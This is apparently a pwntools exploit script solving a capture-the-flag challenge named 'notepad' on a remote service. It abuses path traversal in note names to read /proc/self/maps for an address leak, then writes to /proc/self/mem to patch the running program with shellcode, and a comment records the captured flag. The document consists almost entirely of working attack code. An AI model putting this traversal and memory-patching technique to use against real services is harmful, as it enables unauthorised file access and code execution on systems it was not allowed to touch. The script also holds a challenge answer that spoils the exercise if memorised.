from pwn import *

context.arch = 'amd64'
#r = process('./notepad')
r = remote('10.113.184.121',29700)
def login(username,password):
    r.sendlineafter(b'> ',b'1')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)

def register(username,password):
    r.sendlineafter(b'> ',b'2')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)    

def new_note(name,length,content):
    r.sendlineafter(b'> ',b'3')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Content Length: ',str(length).encode())
    r.sendafter(b'Content: ',content)

def edit_note(name,offset,length,content):
    r.sendlineafter(b'> ',b'4')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Offset: ',str(offset).encode())
    r.sendlineafter(b'Content Length: ',str(length).encode())
    r.sendafter(b'Content: ',content)

def show_note(name,offset):
    r.sendlineafter(b'> ',b'5')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Offset: ',str(offset).encode())

def read_file(filename,offset):
    path = b'../'* 5 + b'/' * (92-len(filename)) + filename
    show_note(path,offset)
    return r.recv(128)
def write_file(filename,offset,length,content):
    path = b'../'* 5 + b'/' * (92-len(filename)) + filename
    edit_note(path,offset,length,content)



register(b'b',b'b')
login(b'b',b'b')

path = f'/proc'
payload = b'12313'

heap_base = int(read_file(b'/proc/self/maps',0)[:12],16)
print(hex(heap_base))

write_file(b'/proc/self/mem',heap_base+0x1954,2,b'\x87\x87') ### patch new_note

payload = asm('''
    xor rax, rax
    inc rax
    xor rdi, rdi
    inc rdi
    syscall
    ''')
# payload = b'\x90'*11 + payload
write_file(b'/proc/self/mem',heap_base+0x19cf,len(payload),payload) ### patch new_note
print(payload)
input()

new_note(b'123',2,b'12') # flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}

r.interactive()